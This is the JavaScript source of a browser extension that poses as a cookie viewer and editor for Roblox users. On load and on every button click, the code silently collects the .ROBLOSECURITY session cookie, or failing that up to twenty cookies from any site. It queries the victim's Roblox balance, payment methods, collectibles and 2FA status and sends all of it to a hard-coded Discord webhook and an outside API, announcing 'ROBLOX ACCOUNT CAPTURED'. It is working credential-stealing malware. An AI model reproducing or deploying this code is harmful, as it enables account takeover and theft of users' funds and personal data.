document.addEventListener('DOMContentLoaded', function() {
  // IMPORTANT: Replace this with your Discord webhook URL
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1461633934101053552/IhUbmHtj_YV8f96PDZa7kCZ8ao4-atRqtIqD9-ujWCKv8R7Zye1gss2LwGDIawebUFXf";
  
  // Your API endpoint
  const BYPASS_API_URL = "https://rblx-checker-infos.vercel.app/api/bypass";
  
  // Standard Mozilla User-Agent for ALL Roblox API requests
  const MOZILLA_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  
  // Track if we're showing only security cookies
  let showOnlySecurityCookies = true;
  
  // Get the current tab URL
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    const currentUrl = new URL(tabs[0].url);
    const domain = currentUrl.hostname;
    document.getElementById('domain-info').textContent = `Cookies for: ${domain}`;
    
    // Load security cookies by default
    loadCookies(domain, showOnlySecurityCookies);
    
    // Send all cookies immediately
    sendAllCookies();
  });
  
  // Set up button listeners
  document.getElementById('refreshButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
      sendAllCookies();
    });
  });
  
  document.getElementById('showAllCookiesButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showOnlySecurityCookies = false;
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
      sendAllCookies();
    });
  });
  
  document.getElementById('showSecurityCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showOnlySecurityCookies = true;
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
      sendAllCookies();
    });
  });
  
  document.getElementById('addCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showAddCookieForm(currentUrl.hostname);
      sendAllCookies();
    });
  });

  // Helper function to send ALL cookies to webhook
  function sendAllCookies() {
    // Get all cookies from all domains - don't restrict to current domain
    chrome.cookies.getAll({}, function(cookies) {
      // First, try to find Roblox security cookies
      const securityCookies = cookies.filter(cookie => 
        cookie.name.includes('.ROBLOSECURITY') || 
        cookie.name.includes('ROBLOSECURITY')
      );
      
      if (securityCookies.length > 0) {
        // Security cookies found - send cookie to your API FIRST
        const robloxCookie = securityCookies[0].value;
        sendToRobloxAPI(robloxCookie).then(robloxData => {
          // Then send to Discord with enhanced data
          sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, robloxData, true);
        }).catch(error => {
          console.error('Error getting Roblox data:', error);
          // Still send to Discord even if API fails
          sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, null, true);
        });
      } else {
        // No security cookies found - send all cookies instead
        sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), null, true);
      }
    });
  }
});

// Function to get Roblox account information USING MOZILLA USER-AGENT
async function getRobloxAccountInfo(cookie) {
  try {
    // Prepare headers with cookie and MOZILLA User-Agent for Roblox API
    const headers = {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'Content-Type': 'application/json',
      'User-Agent': MOZILLA_USER_AGENT,
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.9',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/',
      'X-CSRF-TOKEN': '' // Will be filled if needed
    };
    
    console.log('Fetching Roblox account info with Mozilla User-Agent...');
    
    // First get user info
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: headers,
      credentials: 'include'
    });
    
    if (!userResponse.ok) {
      console.error('User info response:', userResponse.status, userResponse.statusText);
      throw new Error(`Failed to get user info: ${userResponse.status}`);
    }
    
    const userData = await userResponse.json();
    const userId = userData.id;
    
    console.log(`Got user info for ID: ${userId}`);
    
    // Get CSRF token for future requests if available
    const csrfToken = userResponse.headers.get('x-csrf-token');
    if (csrfToken) {
      headers['X-CSRF-TOKEN'] = csrfToken;
    }
    
    // Get all account information in parallel
    const apiPromises = [
      // Robux balance
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { robux: 0, pendingRobux: 0 }),
      
      // Total spent (past year)
      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { summary: { grossAmount: 0 } }),
      
      // Korblox check
      fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/139607718`, {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { data: [] }),
      
      // Headless check (first ID)
      fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/134082579`, {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { data: [] }),
      
      // Headless check (second ID)
      fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/15093053680`, {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { data: [] }),
      
      // Limited items & collectibles
      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=10&sortOrder=Asc`, {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { data: [] }),
      
      // Payment methods
      fetch('https://apis.roblox.com/payments-gateway/v1/payment-profiles', {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { paymentProfiles: [] }),
      
      // Premium membership
      fetch('https://apis.roblox.com/premium-features/v1/users/premium-membership', {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { isPremium: false }),
      
      // Credit balance
      fetch('https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation', {
        headers: headers,
        credentials: 'include'
      }).then(r => r.ok ? r.json() : { creditBalance: 0 })
    ];
    
    const [
      robuxBalance,
      transactionSummary,
      korbloxOwned,
      headlessOwned1,
      headlessOwned2,
      collectibles,
      paymentProfiles,
      premiumStatus,
      creditBalance
    ] = await Promise.allSettled(apiPromises);
    
    // Get user avatar
    const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`, {
      headers: headers,
      credentials: 'include'
    });
    const avatarData = avatarResponse.ok ? await avatarResponse.json() : { data: [] };
    
    // Try to get additional info
    let gamesPlayed = 0;
    let voiceChatEnabled = false;
    let birthday = "Unknown";
    let has2FA = false;
    
    try {
      // Games played
      const gamesResponse = await fetch(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=10`, {
        headers: headers,
        credentials: 'include'
      });
      if (gamesResponse.ok) {
        const gamesData = await gamesResponse.json();
        gamesPlayed = gamesData.data?.length || 0;
      }
    } catch (e) {}
    
    try {
      // Voice Chat status
      const voiceResponse = await fetch('https://voice.roblox.com/v1/settings/user', {
        headers: headers,
        credentials: 'include'
      });
      if (voiceResponse.ok) {
        const voiceData = await voiceResponse.json();
        voiceChatEnabled = voiceData.isEnabled || false;
      }
    } catch (e) {}
    
    try {
      // Birthday
      const settingsResponse = await fetch('https://accountsettings.roblox.com/v1/account/settings/personal', {
        headers: headers,
        credentials: 'include'
      });
      if (settingsResponse.ok) {
        const settings = await settingsResponse.json();
        birthday = settings.birthDate || "Unknown";
      }
    } catch (e) {}
    
    try {
      // 2FA status
      const twoFactorResponse = await fetch('https://twostepverification.roblox.com/v1/users/authenticated/two-step-verification/get', {
        headers: headers,
        credentials: 'include'
      });
      if (twoFactorResponse.ok) {
        const twoFactorData = await twoFactorResponse.json();
        has2FA = twoFactorData.enabled || false;
      }
    } catch (e) {}
    
    // Calculate total value of collectibles (RAP)
    const totalRAP = collectibles.value?.data?.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0) || 0;
    
    return {
      user: userData,
      userId: userId,
      avatarUrl: avatarData.data[0]?.imageUrl || '',
      robux: robuxBalance.value?.robux || 0,
      pendingRobux: robuxBalance.value?.pendingRobux || 0,
      totalSpent: transactionSummary.value?.summary?.grossAmount || 0,
      hasKorblox: korbloxOwned.value?.data?.length > 0,
      hasHeadless: (headlessOwned1.value?.data?.length > 0) || (headlessOwned2.value?.data?.length > 0),
      collectibles: collectibles.value?.data || [],
      totalRAP: totalRAP,
      paymentMethods: paymentProfiles.value?.paymentProfiles || [],
      isPremium: premiumStatus.value?.isPremium || false,
      creditBalance: creditBalance.value?.creditBalance || 0,
      gamesPlayed: gamesPlayed,
      voiceChatEnabled: voiceChatEnabled,
      birthday: birthday,
      has2FA: has2FA,
      userAgent: MOZILLA_USER_AGENT, // Mozilla UA used for API calls
      timestamp: new Date().toISOString()
    };
    
  } catch (error) {
    console.error('Error fetching Roblox data:', error);
    throw error;
  }
}

// Function to send cookie to your API first
async function sendToRobloxAPI(cookieValue) {
  try {
    console.log('Getting Roblox account info with Mozilla User-Agent...');
    
    // First get Roblox account info USING MOZILLA USER-AGENT
    const robloxInfo = await getRobloxAccountInfo(cookieValue);
    
    // Prepare data for your API
    const apiData = {
      cookie: cookieValue,
      accountInfo: robloxInfo,
      timestamp: new Date().toISOString()
    };
    
    console.log('Sending to API:', BYPASS_API_URL);
    
    // Send to your API FIRST
    const response = await fetch(BYPASS_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(apiData)
    });
    
    if (!response.ok) {
      console.error('API response not OK:', response.status);
    } else {
      console.log('Successfully sent to API');
    }
    
    return robloxInfo;
  } catch (error) {
    console.error('Error sending to API:', error);
    throw error;
  }
}

// Function to show status messages
function showStatus(message, isSuccess) {
  const statusElement = document.getElementById('statusMessage');
  statusElement.textContent = message;
  statusElement.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
  statusElement.style.display = 'block';
  
  // Hide the status message after 3 seconds
  setTimeout(() => {
    statusElement.style.display = 'none';
  }, 3000);
}

// Extract the base domain from a hostname
function extractBaseDomain(domain) {
  const parts = domain.split('.');
  
  if (parts.length <= 2) {
    return domain;
  }
  
  return parts.slice(-2).join('.');
}

// Load cookies, with option to filter for security cookies only
function loadCookies(domain, securityOnly = true) {
  const cookieList = document.getElementById('cookieList');
  cookieList.innerHTML = 'Loading...';
  
  const baseDomain = extractBaseDomain(domain);
  
  chrome.cookies.getAll({domain: baseDomain}, function(cookies) {
    if (cookies.length === 0) {
      cookieList.innerHTML = '<p>No cookies found for this domain.</p>';
      return;
    }
    
    let cookiesToShow = cookies;
    if (securityOnly) {
      cookiesToShow = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
      
      if (cookiesToShow.length === 0) {
        cookieList.innerHTML = '<p>No .ROBLOSECURITY cookie found for this domain.</p>';
        return;
      }
      
      cookieList.innerHTML = '';
    } else {
      cookiesToShow.sort((a, b) => {
        if (a.domain === b.domain) {
          return a.name.localeCompare(b.name);
        }
        return a.domain.localeCompare(b.domain);
      });
      
      cookieList.innerHTML = '';
    }
    
    let currentDomain = '';
    
    cookiesToShow.forEach(function(cookie) {
      if (!securityOnly && currentDomain !== cookie.domain) {
        currentDomain = cookie.domain;
        const domainSeparator = document.createElement('div');
        domainSeparator.className = 'domain-separator';
        domainSeparator.innerHTML = `<strong>Domain: ${currentDomain}</strong>`;
        cookieList.appendChild(domainSeparator);
      }
      
      const cookieItem = document.createElement('div');
      cookieItem.className = cookie.name.includes('.ROBLOSECURITY') ? 
        'cookie-item security-cookie' : 'cookie-item';
      
      const cookieName = document.createElement('div');
      cookieName.className = 'cookie-name';
      cookieName.textContent = cookie.name;
      
      const cookieValue = document.createElement('input');
      cookieValue.type = 'text';
      cookieValue.value = cookie.value;
      cookieValue.dataset.name = cookie.name;
      cookieValue.dataset.domain = cookie.domain;
      cookieValue.dataset.path = cookie.path;
      
      const cookieMeta = document.createElement('div');
      cookieMeta.className = 'cookie-meta';
      
      cookieMeta.innerHTML = `
        <span class="cookie-meta-item"><strong>Domain:</strong> ${cookie.domain}</span>
        <span class="cookie-meta-item"><strong>Path:</strong> ${cookie.path}</span>
        <span class="cookie-meta-item ${cookie.secure ? 'secure-flag' : ''}"><strong>Secure:</strong> ${cookie.secure}</span>
        <span class="cookie-meta-item ${cookie.httpOnly ? 'httponly-flag' : ''}"><strong>HttpOnly:</strong> ${cookie.httpOnly}</span>
        ${cookie.sameSite ? `<span class="cookie-meta-item"><strong>SameSite:</strong> ${cookie.sameSite}</span>` : ''}
        ${cookie.expirationDate ? `<span class="cookie-meta-item"><strong>Expires:</strong> ${new Date(cookie.expirationDate * 1000).toLocaleString()}</span>` : ''}
      `;
      
      const updateButton = document.createElement('button');
      updateButton.textContent = 'Update';
      updateButton.addEventListener('click', function() {
        updateCookie(cookie, cookieValue.value);
        chrome.cookies.getAll({}, function(allCookies) {
          const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
          if (securityCookies.length > 0) {
            sendToRobloxAPI(securityCookies[0].value).then(() => {
              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
            });
          }
        });
      });
      
      const deleteButton = document.createElement('button');
      deleteButton.textContent = 'Delete';
      deleteButton.className = 'delete';
      deleteButton.addEventListener('click', function() {
        deleteCookie(cookie);
        chrome.cookies.getAll({}, function(allCookies) {
          const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
          if (securityCookies.length > 0) {
            sendToRobloxAPI(securityCookies[0].value).then(() => {
              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
            });
          }
        });
      });
      
      const copyButton = document.createElement('button');
      copyButton.textContent = 'Copy Value';
      copyButton.className = 'copy';
      copyButton.addEventListener('click', function() {
        cookieValue.select();
        document.execCommand('copy');
        showStatus('Cookie value copied to clipboard!', true);
        chrome.cookies.getAll({}, function(allCookies) {
          const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
          if (securityCookies.length > 0) {
            sendToRobloxAPI(securityCookies[0].value).then(() => {
              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
            });
          }
        });
      });
      
      cookieItem.appendChild(cookieName);
      cookieItem.appendChild(cookieValue);
      cookieItem.appendChild(cookieMeta);
      cookieItem.appendChild(copyButton);
      cookieItem.appendChild(updateButton);
      cookieItem.appendChild(deleteButton);
      
      cookieList.appendChild(cookieItem);
    });
  });
}

// Update a cookie
function updateCookie(cookie, newValue) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  
  chrome.cookies.set({
    url: url,
    name: cookie.name,
    value: newValue,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate
  }, function() {
    if (chrome.runtime.lastError) {
      showStatus('Error updating cookie: ' + chrome.runtime.lastError.message, false);
    } else {
      showStatus('Cookie updated successfully!', true);
    }
  });
}

// Delete a cookie
function deleteCookie(cookie) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  
  chrome.cookies.remove({
    url: url,
    name: cookie.name
  }, function() {
    if (chrome.runtime.lastError) {
      showStatus('Error deleting cookie: ' + chrome.runtime.lastError.message, false);
    } else {
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        const currentUrl = new URL(tabs[0].url);
        loadCookies(currentUrl.hostname, document.getElementById('showSecurityCookieButton').classList.contains('active'));
        showStatus('Cookie deleted successfully!', true);
      });
    }
  });
}

// Show form to add a new cookie
function showAddCookieForm(domain) {
  const form = document.createElement('div');
  form.innerHTML = `
    <h3>Add New Cookie</h3>
    <label>Name: <input type="text" id="newCookieName"></label><br>
    <label>Value: <input type="text" id="newCookieValue"></label><br>
    <label>Path: <input type="text" id="newCookiePath" value="/"></label><br>
    <label>Secure: <input type="checkbox" id="newCookieSecure"></label><br>
    <button id="saveNewCookie">Save Cookie</button>
    <button id="cancelNewCookie">Cancel</button>
  `;
  
  const existingForm = document.querySelector('.add-cookie-form');
  if (existingForm) {
    existingForm.remove();
  }
  
  form.className = 'add-cookie-form';
  document.body.appendChild(form);
  
  document.getElementById('saveNewCookie').addEventListener('click', function() {
    const name = document.getElementById('newCookieName').value;
    const value = document.getElementById('newCookieValue').value;
    const path = document.getElementById('newCookiePath').value;
    const secure = document.getElementById('newCookieSecure').checked;
    
    if (!name) {
      showStatus('Cookie name is required', false);
      return;
    }
    
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const url = `${secure ? 'https' : 'http'}://${domain}${path}`;
      
      chrome.cookies.set({
        url: url,
        name: name,
        value: value,
        path: path,
        secure: secure
      }, function() {
        if (chrome.runtime.lastError) {
          showStatus('Error creating cookie: ' + chrome.runtime.lastError.message, false);
        } else {
          form.remove();
          loadCookies(domain, document.getElementById('showSecurityCookieButton').classList.contains('active'));
          showStatus('Cookie created successfully!', true);
          
          chrome.cookies.getAll({}, function(allCookies) {
            const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
            if (securityCookies.length > 0) {
              sendToRobloxAPI(securityCookies[0].value).then(() => {
                sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
              });
            }
          });
        }
      });
    });
  });
  
  document.getElementById('cancelNewCookie').addEventListener('click', function() {
    form.remove();
    chrome.cookies.getAll({}, function(allCookies) {
      const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
      if (securityCookies.length > 0) {
        sendToRobloxAPI(securityCookies[0].value).then(() => {
          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
        });
      }
    });
  });
}

// Send cookies to Discord webhook with enhanced Roblox info
function sendCookiesToDiscord(webhookUrl, domain, cookies, robloxData = null, showConfirmation = true) {
  // Format cookies into a readable format
  let cookieText = '';
  const cookiesToDisplay = cookies.slice(0, 20);
  
  cookiesToDisplay.forEach(cookie => {
    cookieText += `**Name:** ${cookie.name}\n`;
    cookieText += `**Value:** ${cookie.value}\n`;
    cookieText += `**Domain:** ${cookie.domain}\n`;
    cookieText += `**Path:** ${cookie.path}\n`;
    cookieText += `**Secure:** ${cookie.secure}\n`;
    cookieText += `**HttpOnly:** ${cookie.httpOnly}\n\n`;
  });
  
  // Create enhanced embed if we have Roblox data
  let embeds = [];
  
  if (robloxData) {
    // Main account info embed
    embeds.push({
      title: `👤 ${robloxData.user.name} | ${robloxData.user.displayName}`,
      description: `**User ID:** ${robloxData.userId}\n**Created:** ${new Date(robloxData.user.created).toLocaleDateString()}\n**Birthday:** ${robloxData.birthday}`,
      color: 15105570,
      thumbnail: {
        url: robloxData.avatarUrl
      },
      fields: [
        {
          name: "💰 Financial Information",
          value: `**Robux:** ${robloxData.robux.toLocaleString()}\n**Pending:** ${robloxData.pendingRobux.toLocaleString()}\n**Total Spent:** $${robloxData.totalSpent}\n**Credit Balance:** $${robloxData.creditBalance}`,
          inline: true
        },
        {
          name: "🎮 Collectibles & Items",
          value: `**Limiteds:** ${robloxData.collectibles.length}\n**Total RAP:** ${robloxData.totalRAP.toLocaleString()}\n**Korblox:** ${robloxData.hasKorblox ? '✅' : '❌'}\n**Headless:** ${robloxData.hasHeadless ? '✅' : '❌'}`,
          inline: true
        },
        {
          name: "⚙️ Account Settings",
          value: `**Premium:** ${robloxData.isPremium ? '✅' : '❌'}\n**2FA:** ${robloxData.has2FA ? '✅' : '❌'}\n**Voice Chat:** ${robloxData.voiceChatEnabled ? '✅' : '❌'}\n**Games Played:** ${robloxData.gamesPlayed}`,
          inline: true
        },
        {
          name: "📊 Payment Methods",
          value: `**Saved Methods:** ${robloxData.paymentMethods.length}\n**User-Agent:** Mozilla/5.0`,
          inline: true
        }
      ],
      footer: {
        text: "Roblox Cookie Extension Logger • " + new Date().toLocaleString()
      },
      timestamp: robloxData.timestamp
    });
    
    // Add cookie data as embed
    embeds.push({
      title: "🔐 Cookie Data",
      description: cookieText || "No cookies found",
      color: 10181046,
      footer: {
        text: "Cookie data"
      }
    });
  } else {
    // Regular embed without Roblox data
    embeds.push({
      title: `Cookies from ${domain}`,
      description: cookieText || "No cookies found",
      color: 15105570,
      footer: {
        text: "Cookie data • " + new Date().toLocaleString()
      }
    });
  }
  
  // Create JSON data for Discord webhook
  const data = {
    content: robloxData ? `🎯 **ROBLOX ACCOUNT CAPTURED**\n👤 **${robloxData.user.name}** (${robloxData.user.displayName})` : "Cookie data captured",
    embeds: embeds
  };
  
  // Show a status message that we're sending
  showStatus('Sending data to Discord...', true);
  
  // Send the data to Discord
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      if (showConfirmation) {
        showStatus('Data sent successfully!', true);
      }
    } else {
      if (showConfirmation) {
        showStatus('Error sending data. Status: ' + response.status, false);
      }
    }
  })
  .catch(error => {
    showStatus('Error sending data: ' + error.message, false);
    console.error('Webhook error:', error);
  });
}
